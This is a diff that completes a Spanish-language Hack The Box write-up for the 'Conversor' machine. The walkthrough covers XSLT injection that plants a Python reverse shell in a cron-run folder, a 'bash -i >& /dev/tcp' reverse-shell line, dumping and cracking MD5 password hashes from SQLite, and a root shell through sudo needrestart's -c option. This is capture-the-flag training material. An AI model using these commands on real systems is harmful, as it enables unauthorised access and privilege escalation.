@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Conversor - Hack The Box
-excerpt: "."
+excerpt: "Esta fue una máquina sencilla, pero que te puedes perder si no tienes cuidado. Después de analizar los escaneos, vemos que la página web activa en el puerto 80, está usando Virtual Hosting, pues el escaneo nos muestra un dominio. Registramos el dominio en el /etc/hosts y visitamos la página. Resulta ser un login, que nos deja registrarnos como un nuevo usuario. Entrando al login, vemos un dashboard en donde podemos hacer conversiones de archivos XML usando archivos XSLT para generar un archivo HTML. También, vemos que en la sección About, nos comparten el proyecto completo, que después de descargarlo y analizarlo, vemos que es vulnerable a inyecciones XSLT. Aplicamos algunas inyecciones para inyectar un script de Python que ejecuta una Reverse Shell, con la que ganamos acceso principal a la máquina víctima. Dentro, enumeramos la base de datos de la página web, utilizando el comando sqlite3, descubriendo la contraseña de un usuario como un hash MD5, que crackeamos con JohnTheRipper y nos conectamos a la máquina vía SSH. Ya como el nuevo usuario, vemos que puede usar la herramienta needrestart como Root. Investigando la herramienta, resulta que puede leer y ejecutar archivos de texto, si los escribimos con la misma sintaxis que usamos con la librería OS dé Python para ejecutar comandos. Creamos un archivo de texto con una instrucción que nos permitió obtener una shell de Root, logrando escalar privilegios."
 date: 2025-11-01
 classes: wide
 header:
@@ -13,21 +13,44 @@ categories:
   - Easy Machine
 tags:
   - Linux
-  - 
-  - 
+  - SSH
+  - Flask
+  - Virtual Hosting
+  - Web Enumeration
+  - Source Code Analisys
+  - XSLT Injection
+  - BurpSuite
+  - SQLite3 Enumeration
+  - Cracking Hash
+  - Cracking MD5 Hash
+  - Abusing Sudoers Privileges On needrestart Binary
+  - Privesc - Abusing Sudoers Privileges On needrestart Binary
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-conversor/conversor.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-conversor/conversor.png">
+</p>
 
-texto
+Esta fue una máquina sencilla, pero que te puedes perder si no tienes cuidado. Después de analizar los escaneos, vemos que la página web activa en el **puerto 80**, está usando **Virtual Hosting**, pues el escaneo nos muestra un dominio. Registramos el dominio en el `/etc/hosts` y visitamos la página. Resulta ser un login, que nos deja registrarnos como un nuevo usuario. Entrando al login, vemos un dashboard en donde podemos hacer conversiones de **archivos XML** usando **archivos XSLT** para generar un **archivo HTML**. También, vemos que en la sección **About**, nos comparten el proyecto completo, que después de descargarlo y analizarlo, vemos que es vulnerable a **inyecciones XSLT**. Aplicamos algunas inyecciones para inyectar un script de **Python** que ejecuta una **Reverse Shell**, con la que ganamos acceso principal a la máquina víctima. Dentro, enumeramos la base de datos de la página web, utilizando el comando **sqlite3**, descubriendo la contraseña de un usuario como un **hash MD5**, que crackeamos con **JohnTheRipper** y nos conectamos a la máquina vía **SSH**. Ya como el nuevo usuario, vemos que puede usar la herramienta **needrestart** como **Root**. Investigando la herramienta, resulta que puede leer y ejecutar archivos de texto, si los escribimos con la misma sintaxis que usamos con la **librería OS** dé **Python** para ejecutar comandos. Creamos un archivo de texto con una instrucción que nos permitió obtener una shell de **Root**, logrando escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *Wappalizer*
+* *file*
+* *tar*
+* *cat*
+* *BurpSuite*
+* *nc*
+* *python3*
+* *grep*
+* *which*
+* *sqlite3*
+* *nano*
+* *JohnTheRipper*
+* *ssh*
+* *sudo*
+* *needrestart*
 
 
 <br>
@@ -43,17 +66,21 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#Codigo">Analizando Archivos del Proyecto Descargado</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#XSLTi">Aplicando XSLT Injections para Inyectar Scripts de Python</a></li>
+				<ul>
+					<li><a href="#revShell1">Inyectando un Script de Python con una Reverse Shell</a></li>
+					<li><a href="#revShell2">Inyectando Script de Python que Lee Archivo Remoto y Ejecuta una Reverse Shell</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#usersDB">Enumeración de Base de Datos de SQLite3 y Crackeo de Hashes MD5</a></li>
+				<li><a href="#needrestart">Abusando de Permisos Sudoers sobre Binario needrestart para Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -221,7 +248,7 @@ Veamos qué nos reporta **Wappalizer**:
 
 Nada nuevo como tal.
 
-Esta página nos sirve para hacer una conversión entre un **archivo XML** y una plantilla de un **archivo XSLT**, siendo solo para enbellecer nuestros escaneos con **nmap**.
+Esta página nos sirve para hacer una conversión entre un **archivo XML** y una plantilla de un **archivo XSLT**, siendo solo para convertir nuestros escaneos de **nmap** en **archivos HTML**.
 
 También nos comparten una plantilla de **XSLT**, para que la usemos como prueba.
 
@@ -247,13 +274,14 @@ Descarguemos ese archivo comprimido y analicemos el contenido.
 
 <h2 id="Codigo">Analizando Archivos del Proyecto Descargado</h2>
 
-Veamos primero de que forma esta comprimido el archivo:
+Veamos primero de qué forma está comprimido el archivo:
 ```bash
 file source_code.tar.gz
 source_code.tar.gz: POSIX tar archive (GNU)
 ```
+Solo esta comprimido por **tar**.
 
-Descomprimelo:
+Descomprímelo:
 ```bash
 tar -xvf source_code.tar.gz
 
@@ -293,9 +321,9 @@ If you want to run Python scripts (for example, our server deletes all files old
 ```
 En efecto, es una aplicación web creada con **Flask**.
 
-Pero aquí me llama la atención el mensaje que nos dejan los creadores, ya que la instalación crea una **tarea CRON** que ejecutara cualquier script de **Python** que este dentro de la ruta `/var/www/conversor.htb/scripts/`.
+Pero aquí me llama la atención el mensaje que nos dejan los creadores, ya que la instalación crea una **tarea CRON** que ejecutara cualquier script de **Python** que esté dentro de la ruta `/var/www/conversor.htb/scripts/`.
 
-Además, podemos ver como se configura la ruta de la aplicación web.
+Además, podemos ver cómo se configura la ruta de la aplicación web.
 
 Ahora analicemos el script **app.py**:
 ```bash
@@ -355,16 +383,16 @@ def convert():
         return f"Error: {e}"
 ...
 ```
-Solamente copie las partes del script que nos pueden dar información valiosa.
+Solamente copié las partes del script que nos pueden dar información valiosa.
 
 Esto es lo que podemos encontrar en este script:
-* Al principio vemos las librerias que se estan usando, la ubicación de la llave secreta y la ruta de la base de datos, siendo `/var/www/conversor.htb/instance/users.db`.
-* Un poco abajo, vemos la función para conectarse a la BD y vemos que se esta usando **SQLite3**, algo que también podemos notar en las librerías usadas.
-* Bajando más, vemos la funcion **register()**, donde descubrimos que las contraseñas de cada registro, se convierten en **hashes MD5**, pero no vemos que se le agregue un **salt** para más seguridad, lo que los hace facilmente crackeables.
+* Al principio vemos las librerías que se están usando, la ubicación de la llave secreta y la ruta de la base de datos, siendo `/var/www/conversor.htb/instance/users.db`.
+* Un poco abajo, vemos la función para conectarse a la BD y vemos que se está usando **SQLite3**, algo que también podemos notar en las librerías usadas.
+* Bajando más, vemos la función **register()**, donde descubrimos que las contraseñas de cada registro, se convierten en **hashes MD5**, pero no vemos que se le agregue un **salt** para más seguridad, lo que los hace fácilmente crackeables.
 * Más abajo, vemos la función **convert()**, siendo esta la que se encarga de hacer las conversiones usando el **archivo XML y XSLT**, dando resultado a un **archivo HTML**.
 * Y al final, vemos la función **view_file()**, que es la que muestra el archivo convertido en el dashboard.
 
-El problema de toda la aplicación, se encuentra en la función **convert()**, más en especifico, esta sección:
+El problema de toda la aplicación, se encuentra en la función **convert()**, más en específico, esta sección:
 ```bash
 try:
         parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
@@ -390,7 +418,7 @@ Tratemos de aplicar estas inyecciones.
 <br>
 
 
-<h2 id="XSLTi">Aplicando XSLT Injections para Cargar una Shell en el Directorio Scripts</h2>
+<h2 id="XSLTi">Aplicando XSLT Injections para Inyectar Scripts de Python</h2>
 
 ¿Qué son las **Inyecciones XSLT**?
 
@@ -408,7 +436,7 @@ Estas inyecciones nos pueden ayudar a:
 
 <br>
 
-Te comparto estos 3 blogs que nos explican como aplicar **inyecciones XSLT**, pero te recomiendo prestar bastante atención al de **PayloadAllTheThings**:
+Te comparto estos 3 blogs que nos explican cómo aplicar **inyecciones XSLT**, pero te recomiendo prestar bastante atención al de **PayloadAllTheThings**:
 * <a href="https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0" target="_blank">Attacking XSLT in Web Applications</a>
 * <a href="https://ine.com/blog/xslt-injections-for-dummies" target="_blank">XSLT Injections for Dummies</a>
 * <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" target="_blank">PayloadAllTheThings: XSLT Injection</a>
@@ -424,7 +452,7 @@ cat test.xml
 <root />
 ```
 
-Y creamos nuestro **archivo XSLT**, agregandole una inyección que nos permita leer un archivo interno:
+Y creamos nuestro **archivo XSLT**, agregándole una inyección que nos permita leer un archivo interno:
 ```bash
 cat test.xslt
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
@@ -446,11 +474,11 @@ Para que podamos hacer más pruebas sin tener que estar subiendo los archivos ca
 
 Observa que la inyección no fue exitosa.
 
-Podríamos tratar de ver un archivo interno, es decir, de la aplicación web como el script **app.py** o tratar de leer un archivo remoto, que seria un **SSRF**, pero ninguno de estos servira.
+Podríamos tratar de ver un archivo interno, es decir, de la aplicación web como el script **app.py** o tratar de leer un archivo remoto, que sería un **SSRF**, pero ninguno de estos servirá.
 
 Recordemos que al leer el archivo **install.md**, nos dicen que la ruta `/var/www/conversor.htb/scripts/*.py` puede ser usada para ejecutar scripts de **Python**, pues al instalar el proyecto, se crea una **tarea CRON** para esto.
 
-Entonces, tratemos de inyectar un script que nos mande una **Reverse Shell**, que justo **PayloadAllTheThings** nos indica como hacerlo:
+Entonces, tratemos de inyectar un script que nos mande una **Reverse Shell**, que justo **PayloadAllTheThings** nos indica cómo hacerlo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-conversor/Captura10.png">
@@ -466,7 +494,7 @@ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-Utilizaremos la inyección que nos da **PayloadAllTheThings**, pero debemos cambiar la ruta para indicar donde debe guardarse y escribiremos el código que se va a ejecutar, quedando así:
+Utilizaremos la inyección que nos da **PayloadAllTheThings**, pero debemos cambiar la ruta para indicar dónde debe guardarse y escribiremos el código que se va a ejecutar, quedando así:
 ```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet
@@ -480,7 +508,7 @@ Utilizaremos la inyección que nos da **PayloadAllTheThings**, pero debemos camb
 </xsl:stylesheet>
 ```
 
-Copiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecutala:
+Cópiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecútala:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-conversor/Captura11.png">
@@ -492,7 +520,7 @@ Observa que no nos dio ningún error y en el dashboard de la página, nos aparec
 <img src="/assets/images/htb-writeup-conversor/Captura12.png">
 </p>
 
-Si entras en ese link, no veras nada, pero si regresas a la **netcat**, veras que ya estamos dentro:
+Si entras en ese link, no verás nada, pero si regresas a la **netcat**, verás que ya estamos dentro:
 ```bash
 nc -nlvp 443
 listening on [any] 443 ...
@@ -544,7 +572,7 @@ cat shell.sh
 bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
 ```
 
-Utilizamos la misma inyección que en el ejemplo anterio, solo modificada
+Utilizamos la misma inyección que en el ejemplo anterior, solo modificada:
 ```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet
@@ -558,7 +586,7 @@ Utilizamos la misma inyección que en el ejemplo anterio, solo modificada
 </xsl:stylesheet>
 ```
 
-Copiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecutala:
+Cópiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecútala:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-conversor/Captura13.png">
@@ -570,7 +598,7 @@ Igual que la anterior, no nos dio ningún error y en el dashboard de la página,
 <img src="/assets/images/htb-writeup-conversor/Captura14.png">
 </p>
 
-Si entras en ese link, no veras nada, pero si regresas a la **netcat**, veras que ya estamos dentro:
+Si entras en ese link, no verás nada, pero si regresas a la **netcat**, verás que ya estamos dentro:
 ```bash
 nc -nlvp 443
 listening on [any] 443 ...
@@ -609,64 +637,200 @@ Continuemos.
 <br>
 
 
-<h2 id="usersDB">Análisis de Base de Datos de SQLite3 y Crackeo de Hashes MD5</h2>
+<h2 id="usersDB">Enumeración de Base de Datos de SQLite3 y Crackeo de Hashes MD5</h2>
 
+Veamos dónde nos encontramos:
 ```bash
+www-data@conversor:~$ pwd
+/var/www
+www-data@conversor:~$ ls
+conversor.htb
+```
+Muy bien, estamos en el directorio donde se guarda la aplicación web.
 
+Antes de investigar más, veamos qué usuarios existen en la máquina:
+```bash
+www-data@conversor:~$ cat /etc/passwd | grep 'bash'
+root:x:0:0:root:/root:/bin/bash
+fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
+```
+Solo hay un usuario, aparte del **Root** y curiosamente, este mismo usuario lo vemos en la sección **About** de la página web.
+
+No podremos ver el contenido de su directorio:
+```bash
+www-data@conversor:~$ ls -la /home
+total 12
+drwxr-xr-x  3 root       root       4096 Jul 31 01:37 .
+drwxr-xr-x 19 root       root       4096 Oct 21 05:45 ..
+drwxr-x---  5 fismathack fismathack 4096 Oct 21 05:45 fismathack
 ```
 
+Uno de los archivos que son de nuestro interés, es la base de datos que se encuentra en la ruta `/conversor.htb/instance`:
 ```bash
-
+www-data@conversor:~$ cd conversor.htb/instance/
+www-data@conversor:~/conversor.htb/instance$ ls
+users.db
 ```
 
+Pero recuerda que es una base de datos de **SQLite3**, por lo que si intentas verla, puede que no sea del todo legible:
 ```bash
-
+www-data@conversor:~/conversor.htb/instance$ file users.db 
+users.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 21, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 21
 ```
 
+Podemos usar la herramienta **sqlite3** para aplicar consultas a esta BD:
 ```bash
+www-data@conversor:~/conversor.htb/instance$ which sqlite3
+/usr/bin/sqlite3
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db ".tables"
+files  users
+```
 
+Obtengamos los usuarios y contraseñas de la tabla **users**:
+```bash
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db "SELECT id, username, password FROM users;"
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|root|63a9f0ea7bb98050796b649e85481845
+...
+```
+Perfecto, observa que son **hashes MD5** y la que nos interesa es del **usuario fismathack**.
+
+Copia el hash en un archivo de texto en tu máquina para que podamos crackearlo con **JohnTheRipper**:
+```bash
+nano hash.txt
+john -w:/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=6
+Press 'q' or Ctrl-C to abort, almost any other key for status
+********** (?)     
+2g 0:00:00:00 DONE (2025-11-02 00:28) 2.247g/s 16116Kp/s 16116Kc/s 29352KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+Tenemos la contraseña.
+
+Podemos autenticarnos con este usuario desde nuestra sesión actual o vía **SSH**.
+
+Yo elegiré lo segundo:
+```bash
+ssh fismathack@10.10.11.92
+fismathack@10.10.11.92's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+...
+Last login: Sun Nov 2 06:29:24 2025
+fismathack@conversor:~$ whoami
+fismathack
+```
+
+Aquí encontraremos la flag del usuario:
+```bash
+fismathack@conversor:~$ ls
+user.txt
+fismathack@conversor:~$ cat user.txt
+...
 ```
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="needrestart">Abusando de Permisos Sudoers sobre Binario needrestart para Escalar Privilegios</h2>
 
+Veamos qué privilegios tiene nuestro usuario:
 ```bash
+fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
+Podemos usar el binario **needrestart** como **Root**.
 
-```bash
+Investiguemos un poco para qué sirve este binario:
 
-```
-
-```bash
-
-```
-
-```bash
-
-```
+| **Binario needrestart** |
+|:-----------------------:|
+| *needrestart es una utilidad (y paquete) que comprueba si, tras actualizaciones de paquetes o cambios en bibliotecas/kerneI, hay procesos en ejecución que usan versiones antiguas de archivos (por ejemplo bibliotecas compartidas, módulos del kernel, o archivos eliminados) y que por tanto deberían reiniciarse para que los cambios tengan efecto. Su objetivo es ayudar a administradores y usuarios a decidir si reiniciar servicios o el sistema completo después de una actualización.* |
 
 <br>
 
-<h2 id=""></h2>
+Entonces, se encarga de revisar las actualizaciones del sistema.
 
+Veamos si hay alguna pendiente:
 ```bash
+fismathack@conversor:~$ sudo /usr/sbin/needrestart
+Scanning processes...                                                                                                                                                                         
+Scanning linux images...                                                                                                                                                                      
 
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+```
+No hay ninguna.
+
+Leamos cómo se usa este binario:
+```bash
+fismathack@conversor:~$ sudo /usr/sbin/needrestart --help
+
+needrestart 3.7 - Restart daemons after library updates.
+...
+Usage:
+
+  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]
+
+    -v		be more verbose
+    -q		be quiet
+    -m <mode>	set detail level
+	e	(e)asy mode
+	a	(a)dvanced mode
+    -n		set default answer to 'no'
+    -c <cfg>	config filename
+    -r <mode>	set restart mode
+	l	(l)ist only
+	i	(i)nteractive restart
+	a	(a)utomatically restart
+    -b		enable batch mode
+...
+```
+Observa el parámetro **-c**, que parece servir para leer y ejecutar archivos de configuración.
+
+Si investigamos cómo funciona este binario, resulta estar hecho con **Python**.
+
+Aunque la versión actual (**3.7**) puede ser vulnerable a un Exploit (**CVE-2024–48990**), en realidad no lo es.
+
+Pero, podemos abusar del parámetro **-c** porque, como mencionaba, permite pasar un archivo que el binario lee/ejecuta en su contexto. 
+
+Si dicho archivo contiene código que ejecute comandos, como lo hacemos normalmente con la **librería OS**, es posible que podamos crear un archivo que ejecute la **Bash** y nos dé una sesión del **Root**.
+
+Usaríamos la misma sintaxis que usamos con la **librería OS**:
+```bash
+fismathack@conversor:~$ cat privesc.txt 
+system("/bin/bash")
 ```
 
+Observa lo que pasa cuando lo leemos con **needrestart**:
 ```bash
-
+fismathack@conversor:~$ sudo /usr/sbin/needrestart -c ./privesc.txt
+root@conversor:/home/fismathack# whoami
+root
 ```
+Somos **Root**.
 
+Obtengamos la última flag:
 ```bash
-
+root@conversor:/home/fismathack# cd /root/
+root@conversor:~# ls
+root.txt  scripts
+root@conversor:~# cat root.txt
+...
 ```
-
-```bash
-
-```
-
+Y con esto terminamos la máquina.
 
 
 <br>
@@ -676,10 +840,17 @@ Continuemos.
 </div>
 
 
-links
+* https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0
+* https://ine.com/blog/xslt-injections-for-dummies
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#remote-code-execution-with-native-net
+* https://www.atlan.digital/lab/xslt-injection-basics.html
+* https://www.revshells.com/
+* https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80
+* https://github.com/liske/needrestart
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
